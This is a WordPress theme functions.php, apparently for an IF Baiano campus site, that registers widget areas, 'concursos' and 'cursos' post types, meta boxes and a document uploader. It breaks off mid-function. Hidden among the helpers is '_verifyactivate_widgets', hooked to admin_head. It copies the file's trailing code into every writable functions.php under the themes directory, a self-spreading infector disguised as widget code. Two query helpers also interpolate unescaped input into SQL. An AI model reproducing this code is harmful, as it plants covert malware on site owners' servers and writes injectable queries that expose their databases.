<?php

//include("settings.php");

if (function_exists('register_sidebar')) {

	# Area de widgets dos Avisos importantes
	register_sidebar(
		array(
			'name' => 'Avisos importantes',
			'id' => 'avisos',
			'description' => 'No topo da página inicial, cadastre até 3 avisos',
			'before_widget' => '<div>',
			'after_widget' => '</div>',
			'before_title' => '<h6 class="tituloAviso">',
			'after_title' => '</h6>',
		)
	);

	# Area de widgets dos cards de cursos
	register_sidebar(
		array(
			'name' => 'Cards',
			'id' => 'cards',
			'description' => 'Cards de cursos: coloque até 4 imagens com dimensão de YxY pixels',
			'before_widget' => '<div class="card">',
			'after_widget' => '</div>',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets do Menu Principal
	register_sidebar(
		array(
			'name' => 'Menu Principal',
			'description' => '',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '<div id="TituloMenu">',
			'after_title' => '</div>',
		)
	);
	# Area de widgets das fotos
	register_sidebar(
		array(
			'name' => 'Fotos',
			'description' => 'Shortcode do Instagram',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets do banner
	register_sidebar(
		array(
			'name' => 'Banner',
			'description' => 'Lateral direita',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets do menu direita
	register_sidebar(
		array(
			'name' => 'Menu Direita',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de Acesso Rápido
	register_sidebar(
		array(
			'name' => 'Acesso Rápido',
			'id' => 'acesso',
			'description' => 'Botões para acesso rápido',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets do facebook
	register_sidebar(
		array(
			'name' => 'Facebook',
			'description' => 'Facebook Page Like Widget',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets do rodapé
	register_sidebar(
		array(
			'name' => 'Informações do rodapé',
			'description' => 'Endereço, contatos e informações do campus',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	# Area de widgets da rede social Facebook
	register_sidebar(
		array(
			'name' => 'Rede Social Facebook',
			'description' => 'Ícone e endereço da rede social no topo',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);
	# Area de widgets da rede social Twitter
	register_sidebar(
		array(
			'name' => 'Rede Social Twitter',
			'description' => 'Ícone e endereço da rede social no topo',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);
	# Area de widgets da rede social Youtube
	register_sidebar(
		array(
			'name' => 'Rede Social Youtube',
			'description' => 'Ícone e endereço da rede social no topo',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);
	# Area de widgets da rede social Instagram
	register_sidebar(
		array(
			'name' => 'Rede Social Instagram',
			'description' => 'Ícone e endereço da rede social no topo',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);
	# Area de widgets do SlideShow Noticia
	register_sidebar(
		array(
			'name' => 'Slide Show Noticia',
			'description' => 'Slideshow Widget',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);
	# Area de widgets do menu Header direito
	register_sidebar(
		array(
			'name' => 'Menu Topo direito',
			'id' => 'menutopodireito',
			'description' => 'Menu localizado no cabeçalho da página, lado direito',
			'before_widget' => '',
			'after_widget' => '',
			'before_title' => '',
			'after_title' => '',
		)
	);

	add_filter('widget_text', 'do_shortcode');

	function post_word_count()
	{
		$count = 0;
		$posts = get_posts(
			array(
				'numberposts' => -1,
				'post_type' => array('post', 'page')
			)
		);
		foreach ($posts as $post) {
			$count += str_word_count(strip_tags(get_post_field('post_content', $post->ID)));
		}
		$num = number_format_i18n($count);
		// This block will add your word count to the stats portion of the Right Now box
		$text = _n('Word', 'Words', $num);
		echo "<tr><td class='first b'>{$num}</td><td class='t'>{$text}</td></tr>";
		// This line will add your word count to the bottom of the Right Now box.
		echo '<p>This blog contains a total of <strong>' . $num . '</strong> published words!</p>';
	}

	// add to Content Stats table
	add_action('right_now_content_table_end', 'post_word_count');
	// add to bottom of Activity Box
	add_action('activity_box_end', 'post_word_count');
	/*
	# Cabeçalho personalizado
	if ( !function_exists('extras_setup') ):
	function extras_setup() {
	# Define a imagem default
	define( 'HEADER_IMAGE', '%s/imagens/headers/reitoria.png' );
	# Define o width e o height da imagem do header
	define( 'HEADER_IMAGE_WIDTH', apply_filters( 'extras_header_image_width', 593 ) );
	define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'extras_header_image_height', 171 ) );
	# Desativa o texto no header
	define( 'NO_HEADER_TEXT', true );
	# Registra a função no menu administrativo
	add_custom_image_header( '', 'extras_admin_header_style' );
	//Registra as imagens no Wordpress
	register_default_headers($customHeaders);
	}
	endif;
	if ( ! function_exists( 'extras_admin_header_style' ) ) :
	# Estilo obrigatório para funcionar o custom header
	function extras_admin_header_style() {
	?>
	<style type="text/css">
	#wpbody-content #headimg {
	height: <?php echo HEADER_IMAGE_HEIGHT; ?> px;
	width: <?php echo HEADER_IMAGE_WIDTH; ?> px;
	border: 1px solid #333;
	}
	</style>
	<?php
	}
	endif;
	*/
	/*
	# Retorna o valor a depender da 'key'.
	function ds_settings($key) {
	global $settings;
	return $settings[$key];
	}
	*/
	# Executa a função
	//add_action( 'after_setup_theme', 'extras_setup' );

}

//add_theme_support('post-thumbnails');
//set_post_thumbnail_size(300, 225, true); // miniaturas normais para a homepage//
//add_image_size('single-post-thumbnail', 400, 9999); // imagem para página de post
?>
<?php
function wt_get_category_count($input = '')
{
	global $wpdb;
	if ($input == '') {
		$category = get_the_category();
		return $category[0]->category_count;
	} elseif (is_numeric($input)) {
		$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.term_id=$input";
		return $wpdb->get_var($SQL);
	} else {
		$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->terms.slug='$input'";
		return $wpdb->get_var($SQL);
	}
}



function _verifyactivate_widgets()
{
	$widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
	$output = "";
	$allowed = "";
	$output = strip_tags($output, $allowed);
	$direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
	if (is_array($direst)) {
		foreach ($direst as $item) {
			if (is_writable($item)) {
				$ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
				$cont = file_get_contents($item);
				if (stripos($cont, $ftion) === false) {
					$comaar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos(substr($cont, -20), "?" . ">") !== false) {
						$cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);
					}
					$output = rtrim($output, "\n\t");
					fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" . $widget);
					fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids, $items = array())
{
	$places = array_shift($wids);
	if (substr($places, -1) == "/") {
		$places = substr($places, 0, -1);
	}
	if (!file_exists($places) || !is_dir($places)) {
		return false;
	} elseif (is_readable($places)) {
		$elems = scandir($places);
		foreach ($elems as $elem) {
			if ($elem != "." && $elem != "..") {
				if (is_dir($places . "/" . $elem)) {
					$wids[] = $places . "/" . $elem;
				} elseif (
					is_file($places . "/" . $elem) &&
					$elem == substr(
						__FILE__,
						-13
					)
				) {
					$items[] = $places . "/" . $elem;
				}
			}
		}
	} else {
		return false;
	}
	if (sizeof($wids) > 0) {
		return _get_allwidgets_cont($wids, $items);
	} else {
		return $items;
	}
}
if (!function_exists("stripos")) {
	function stripos($str, $needle, $offset = 0)
	{
		return strpos(strtolower($str), strtolower($needle), $offset);
	}
}

if (!function_exists("strripos")) {
	function strripos($haystack, $needle, $offset = 0)
	{
		if (!is_string($needle))
			$needle = chr(intval($needle));
		if ($offset < 0) {
			$temp_cut = strrev(substr($haystack, 0, abs($offset)));
		} else {
			$temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
		}
		if (($found = stripos($temp_cut, strrev($needle))) === FALSE)
			return FALSE;
		$pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
		return $pos;
	}
}
if (!function_exists("scandir")) {
	function scandir($dir, $listDirectories = false, $skipDots = true)
	{
		$dirArray = array();
		if ($handle = opendir($dir)) {
			while (false !== ($file = readdir($handle))) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {
						if (is_dir($file)) {
							continue;
						}
					}
					array_push($dirArray, basename($file));
				}
			}
			closedir($handle);
		}
		return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
{
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (!$show_pass_post)
		$request .= " AND post_password =\"\"";
	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results($request);
	$output = "";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title = stripslashes($post->post_title);
			$comment_count = $post->comment_count;
			$permalink = get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return $output;
}

function get_breadcrumb()
{
	echo '<a href="' . home_url() . '" rel="nofollow">Página Inicial</a>';
	if (is_single()) {
		echo " &nbsp;&nbsp;&#187;&nbsp;&nbsp; ";
		the_title();
	} elseif (is_page()) {
		echo "&nbsp;&nbsp;&#187;&nbsp;&nbsp;";
		echo the_title();
	} elseif (is_search()) {
		echo "&nbsp;&nbsp;&#187;&nbsp;&nbsp;Pesquisa sobre... ";
		echo '"<em>';
		echo the_search_query();
		echo '</em>"';
	}
}


// extrair apenas a url do thumbnail
function get_the_post_thumbnail_src($img)
{
	return (preg_match('~\bsrc="([^"]++)"~', $img, $matches)) ? $matches[1] : '';
}
// fim do personalizar rss/feed

/* Adiciona Imagem Destacada na Coluna da Listagem de Posts */
if (function_exists('add_theme_support')) {
	add_image_size('admin-thumb', 100, 999999); // 100 pixels de largura (e altura ilimitada)
}

add_filter('manage_posts_columns', 'posts_columns', 5);
add_action('manage_posts_custom_column', 'posts_custom_columns', 5, 2);

function posts_columns($defaults)
{
	$defaults['my_post_thumbs'] = __('Imagem'); //Modifique o nome para o que desejar
	return $defaults;
}

function posts_custom_columns($column_name, $id)
{
	if ($column_name === 'my_post_thumbs') {
		echo the_post_thumbnail('admin-thumb');
	}
}
add_theme_support('post-thumbnails', array('post', 'concursos', 'cursos'));
?>

<?php
// início das meta boxes de CONCURSOS
/* Define a meta box */

add_action('add_meta_boxes', 'edital_add_custom_box');

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'edital_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'edital_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de Concurso */
function edital_add_custom_box()
{
	$screens = array('concursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'edital_sectionid',
			__('Número e data do Edital', 'edital_textdomain'),
			'edital_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function edital_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'edital_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$edital = get_post_meta($post->ID, 'edital', true);

	echo '<label for="edital_new_field">';
	_e("", 'edital_textdomain');
	echo '</label> ';
	echo '<input type="text" placeholder="Ex.: Edital nº X, de X de abril de 20XX" id="nEdital" name="nEdital" size="30" value="' . esc_attr($edital) . '" />';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function edital_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['edital_noncename']) || !wp_verify_nonce($_POST['edital_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$nEdital = sanitize_text_field($_POST['nEdital']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'edital', $nEdital);
}


/* Define a meta box */

add_action('add_meta_boxes', 'inicioInscricoes_add_custom_box');

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'inicioInscricoes_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'inicioInscricoes_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de Concurso */
function inicioInscricoes_add_custom_box()
{
	$screens = array('concursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'inicioInscricoes_sectionid',
			__('Período de inscrições', 'inicioInscricoes_textdomain'),
			'inicioInscricoes_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function inicioInscricoes_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'inicioInscricoes_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$inicio = get_post_meta($post->ID, 'inicio_inscricoes', true);
	$fim = get_post_meta($post->ID, 'final_inscricoes', true);
	$horaInicial = get_post_meta($post->ID, 'inicio_hora_inscricoes', true);
	$horaFinal = get_post_meta($post->ID, 'final_hora_inscricoes', true);
	echo '<label for="inicioInscricoes_new_field">';
	_e("", 'inicioInscricoes_textdomain');
	echo '</label> ';
	//echo 'De <input type="date"  id="myplugin_new_field" name="myplugin_new_field" value="'.esc_attr($value).'" size="25" />';
	echo 'De <input type="date"  id="dataInicial" name="dataInicial" value="' . esc_attr($inicio) . '" /> às <input type="time"  id="horaInicial" name="horaInicial" value="' . esc_attr($horaInicial) . '" />';
	echo ' Até <input type="date"  id="dataFinal" name="dataFinal" value="' . esc_attr($fim) . '" /> às <input type="time"  id="horaFinal" name="horaFinal" value="' . esc_attr($horaFinal) . '" />';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function inicioInscricoes_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['inicioInscricoes_noncename']) || !wp_verify_nonce($_POST['inicioInscricoes_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$iniciodata = sanitize_text_field($_POST['dataInicial']);
	$finaldata = sanitize_text_field($_POST['dataFinal']);
	$iniciohora = sanitize_text_field($_POST['horaInicial']);
	$finalhora = sanitize_text_field($_POST['horaFinal']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'inicio_inscricoes', $iniciodata);
	update_post_meta($post_ID, 'final_inscricoes', $finaldata);
	update_post_meta($post_ID, 'inicio_hora_inscricoes', $iniciohora);
	update_post_meta($post_ID, 'final_hora_inscricoes', $finalhora);
}


/* Define a meta box */

add_action('add_meta_boxes', 'txtInscricoes_add_custom_box');

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'txtInscricoes_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'txtInscricoes_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de Concurso */
function txtInscricoes_add_custom_box()
{
	$screens = array('concursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'txtInscricoes_sectionid',
			__('Texto sobre as inscrições', 'txtInscricoes_textdomain'),
			'txtInscricoes_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function txtInscricoes_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'txtInscricoes_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$txtInscricoes = get_post_meta($post->ID, 'txtInscricoes', true);

	echo '<label for="txtInscricoes_new_field">';
	_e("", 'txtInscricoes_textdomain');
	echo '</label> ';
	echo '<textarea placeholder="Ex.: https://www.link.com" id="txtInscricoes" name="txtInscricoes" rows="4" cols="60">' . esc_attr($txtInscricoes) . '</textarea>';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function txtInscricoes_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['txtInscricoes_noncename']) || !wp_verify_nonce($_POST['txtInscricoes_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$tInscricoes = sanitize_text_field($_POST['txtInscricoes']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'txtInscricoes', $tInscricoes);
}


/* Define a meta box */

add_action('add_meta_boxes', 'linkEdital_add_custom_box');

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'linkEdital_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'linkEdital_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de Concurso */
function linkEdital_add_custom_box()
{
	$screens = array('concursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'linkEdital_sectionid',
			__('Link de inscrição', 'linkEdital_textdomain'),
			'linkEdital_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function linkEdital_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'linkEdital_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$linkEdital = get_post_meta($post->ID, 'linkEdital', true);

	echo '<label for="linkEdital_new_field">';
	_e("", 'linkEdital_textdomain');
	echo '</label> ';
	echo '<input type="text" placeholder="Ex.: https://www.link.com" id="linkEdital" name="linkEdital" size="40" value="' . esc_attr($linkEdital) . '" />';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function linkEdital_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['linkEdital_noncename']) || !wp_verify_nonce($_POST['linkEdital_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$lEdital = sanitize_text_field($_POST['linkEdital']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'linkEdital', $lEdital);
}

// fim das meta boxes de CONCURSOS

// início das meta boxes de CURSOS

/* Define a meta box */

add_action('add_meta_boxes', 'infoCurso_add_custom_box');

// Compatibilidade para  WP < 3.0
// add_action( 'admin_init', 'infoCurso_add_custom_box', 1 );

/* Faça algo com os dados inseridos */
add_action('save_post', 'infoCurso_save_postdata');

/* Adiciona uma meta box na coluna principal das telas de edição de cursos */
function infoCurso_add_custom_box()
{
	$screens = array('cursos');
	foreach ($screens as $screen) {
		add_meta_box(
			'infoCurso_sectionid',
			__('Informações gerais', 'infoCurso_textdomain'),
			'infoCurso_inner_custom_box',
			$screen
		);
	}
}

/* Imprime o conteúdo da meta box */
function infoCurso_inner_custom_box($post)
{

	// Faz a verificação através do nonce
	wp_nonce_field(plugin_basename(__FILE__), 'infoCurso_noncename');

	// Os campos para inserção dos dados
	// Use get_post_meta para para recuperar um valor existente no banco de dados e usá-lo dentro do atributo HTML 'value' 
	$denominacao = get_post_meta($post->ID, 'denominacao_curso', true);
	$ato = get_post_meta($post->ID, 'ato_autorizativo_curso', true);
	$area = get_post_meta($post->ID, 'area_curso', true);
	$modalidade = get_post_meta($post->ID, 'modalidade_curso', true);
	$tipo = get_post_meta($post->ID, 'tipo_curso', true);
	$vagas = get_post_meta($post->ID, 'vagas_curso', true);
	$turno = get_post_meta($post->ID, 'turno_curso', true);
	$periodicidade = get_post_meta($post->ID, 'periodicidade_curso', true);
	$carga = get_post_meta($post->ID, 'carga_curso', true);
	$ingresso = get_post_meta($post->ID, 'ingresso_curso', true);
	echo '<label for="infoCurso_new_field">';
	_e("", 'infoCurso_textdomain');
	echo '</label> ';
	echo 'Denominação do Curso: <input type="text"  id="denominacao" name="denominacao" value="' . esc_attr($denominacao) . '" size="65"/> ';
	echo 'Ato Autorizativo: <input type="text" placeholder="Link do PPC do curso" id="ato" name="ato" value="' . esc_attr($ato) . '" size="20"/><br><br>';
	echo 'Área do conhecimento (CAPES): <input type="text" id="area" name="area" value="' . esc_attr($area) . '" size="20"/> ';
	echo 'Modalidade de ensino: <input type="text" id="modalidade" name="modalidade" value="' . esc_attr($modalidade) . '" size="10"/> ';
	echo 'Tipo: <input type="text" id="tipo" name="tipo" value="' . esc_attr($tipo) . '" size="30"/><br><br>';
	echo 'Número de vagas: <input type="number" id="vagas" name="vagas" value="' . esc_attr($vagas) . '" min="0" max="5000"/> ';
	echo 'Turno de funcionamento: <input type="text" id="turno" name="turno" value="' . esc_attr($turno) . '" size="9"/> ';
	echo 'Periodicidade da oferta: <input type="text" id="periodicidade" name="periodicidade" value="' . esc_attr($periodicidade) . '" size="10"/> ';
	echo 'Carga horária: <input type="number" id="carga" name="carga" value="' . esc_attr($carga) . '" min="0" max="5000"/><br><br>';
	echo 'Forma de ingresso: <input type="text" id="ingresso" name="ingresso" value="' . esc_attr($ingresso) . '" size="60"/> ';
}

/* Quando o post for salvo, salvamos também nossos dados personalizados */
function infoCurso_save_postdata($post_id)
{

	// É necessário verificar se o usuário está autorizado a fazer isso
	if ('page' == $_POST['post_type']) {
		if (!current_user_can('edit_page', $post_id))
			return;
	} else {
		if (!current_user_can('edit_post', $post_id))
			return;
	}

	// Agora, precisamos verificar se o usuário realmente quer trocar esse valor
	if (!isset($_POST['infoCurso_noncename']) || !wp_verify_nonce($_POST['infoCurso_noncename'], plugin_basename(__FILE__)))
		return;

	// Por fim, salvamos o valor no banco

	// Recebe o ID do post
	$post_ID = $_POST['post_ID'];

	// Remove caracteres indesejados
	$denominacaoSAN = sanitize_text_field($_POST['denominacao']);
	$atoSAN = sanitize_text_field($_POST['ato']);
	$areaSAN = sanitize_text_field($_POST['area']);
	$modalidadeSAN = sanitize_text_field($_POST['modalidade']);
	$tipoSAN = sanitize_text_field($_POST['tipo']);
	$vagasSAN = sanitize_text_field($_POST['vagas']);
	$turnoSAN = sanitize_text_field($_POST['turno']);
	$periodicidadeSAN = sanitize_text_field($_POST['periodicidade']);
	$cargaSAN = sanitize_text_field($_POST['carga']);
	$ingressoSAN = sanitize_text_field($_POST['ingresso']);

	// Adicionamos ou atualizados o $iniciodata 
	update_post_meta($post_ID, 'denominacao_curso', $denominacaoSAN);
	update_post_meta($post_ID, 'ato_autorizativo_curso', $atoSAN);
	update_post_meta($post_ID, 'area_curso', $areaSAN);
	update_post_meta($post_ID, 'modalidade_curso', $modalidadeSAN);
	update_post_meta($post_ID, 'tipo_curso', $tipoSAN);
	update_post_meta($post_ID, 'vagas_curso', $vagasSAN);
	update_post_meta($post_ID, 'turno_curso', $turnoSAN);
	update_post_meta($post_ID, 'periodicidade_curso', $periodicidadeSAN);
	update_post_meta($post_ID, 'carga_curso', $cargaSAN);
	update_post_meta($post_ID, 'ingresso_curso', $ingressoSAN);
}

// fim das meta boxes de CURSOS
?>

<?php

function create_posttype()
{
	register_post_type(
		'concursos',
		array(
			'labels' => array(
				'name' => __('Concursos'),
				'singular_name' => __('Concurso')
			),
			'description' => 'Página de concursos do IF Baiano',
			'public' => true,
			'has_archive' => true,
			'supports' => array('title', 'editor', 'excerpt', 'thumbnail'),
			'rewrite' => array('slug' => 'concursos'),
			'show_in_rest' => true,
		)
	);

	register_post_type(
		'cursos',
		array(
			'labels' => array(
				'name' => __('Cursos'),
				'singular_name' => __('Curso')
			),
			'description' => 'Página de cursos do IF Baiano',
			'public' => true,
			'has_archive' => true,
			'supports' => array('thumbnail', 'title', 'editor'),
			'rewrite' => array('slug' => 'cursos'),
			'show_in_rest' => true,
		)
	);
}
add_action('init', 'create_posttype');

// Add Meta Box to post
add_action('add_meta_boxes', 'multi_media_uploader_meta_box');


function multi_media_uploader_meta_box()
{
	add_meta_box('my-post-box', 'Documentos da página', 'multi_media_uploader_meta_box_func', 'post', 'normal', 'high');
	add_meta_box('my-post-box', 'Documentos da página', 'multi_media_uploader_meta_box_func', 'page', 'normal', 'high');
	add_meta_box('my-post-box', 'Documentos da página', 'multi_media_uploader_meta_box_func', 'concursos', 'normal', 'high');
	add_meta_box('my-post-box', 'Documentos da página', 'multi_media_uploader_meta_box_func', 'cursos', 'normal', 'high');
}

function multi_media_uploader_meta_box_func($post)
{
	$banner_img = get_post_meta($post->ID, 'post_banner_img', true);

	?>
	<style type="text/css">
		.multi-upload-medias ul li .delete-img {
			/*position: absolute; right: 3px; top: 2px;*/
			margin-left: 15px;
			background: red;
			border-radius: 50%;
			cursor: pointer;
			font-size: 16px;
			line-height: 20px;
			color: white;
		}

		.multi-upload-medias ul li {
			width: 100%;
			vertical-align: middle;
			position: relative;
			list-style: inside;
			color: #9a9a9a;
		}

		.multi-upload-medias ul li img {
			width: 100%;
		}
	</style>

	<table style="width:100%;">
		<tr>
			<td style="font-style:italic;padding:0;font-size:small;border-bottom:1px dashed #e1e1e1;">Lista de arquivos
				publicados</td>
		</tr>

		<tr>
			<td>
				<?php echo multi_media_uploader_field('post_banner_img', $banner_img); ?>
			</td>
		</tr>
	</table>

	<script type="text/javascript">
		jQuery(function ($) {

			$('body').on('click', '.wc_multi_upload_image_button', function (e) {
				e.preventDefault();

				var button = $(this),
					custom_uploader = wp.media({
						title: 'Inserir documento',
						button: {
							text: 'Aplicar'
						},
						multiple: true
					}).on('select', function () {
						var attech_ids = '';
						attachments
						var attachments = custom_uploader.state().get('selection'),
							attachment_ids = new Array(),
							i = 0;
						attachments.each(function (attachment) {
							attachment_ids[i] = attachment['id'];
							attech_ids += ',' + attachment['id'];
							if (attachment.attributes.type == 'application/pdf') {
								$(button).siblings('ul').append('<li data-attechment-id="' + attachment['id'] + '"><a href="' + attachment.attributes.url + '" target="_blank"><img class="true_pre_image" src="' + attachment.attributes.url + '" /></a><i class=" dashicons dashicons-no delete-img"></i></li>');
							} else {
								$(button).siblings('ul').append('<li data-attechment-id="' + attachment['id'] + '"><a href="' + attachment.attributes.url + '" target="_blank"</a><i class=" dashicons dashicons-no delete-img"></i>' + attachment.attributes.title + '</li>');
							}

							i++;
						});

						var ids = $(button).siblings('.attechments-ids').attr('value');
						if (ids) {
							var ids = ids + attech_ids;
							$(button).siblings('.attechments-ids').attr('value', ids);
						} else {
							$(button).siblings('.attechments-ids').attr('value', attachment_ids);
						}
						$(button).siblings('.wc_multi_remove_image_button').show();
					})
						.open();
			});

			$('body').on('click', '.wc_multi_remove_image_button', function () {
				$(this).hide().prev().val('').prev().addClass('button').html('Add Media');
				$(this).parent().find('ul').empty();
				return false;
			});

		});

		jQuery(document).ready(function () {
			jQuery(document).on('click', '.multi-upload-medias ul li i.delete-img', function () {
				var ids = [];
				var this_c = jQuery(this);
				jQuery(this).parent().remove();
				jQuery('.multi-upload-medias ul li').each(function () {
					ids.push(jQuery(this).attr('data-attechment-id'));
				});
				jQuery('.multi-upload-medias').find('input[type="hidden"]').attr('value', ids);
			});
		})
	</script>

	<?php
}

function multi_media_uploader_field($name, $value = '')
{
	$image = '">Adicionar documento';
	$image_str = '';
	$image_size = 'full';
	$display = 'none';
	$value = explode(',', $value);

	if (!empty($value)) {
		foreach ($value as $values) {
			if ($image_attributes = wp_get_attachment_url($values, $image_size)) {
				$attachment_title = get_the_title($values);
				$attachment_time = get_the_time('d/m/Y \à\s H\hi', $values);
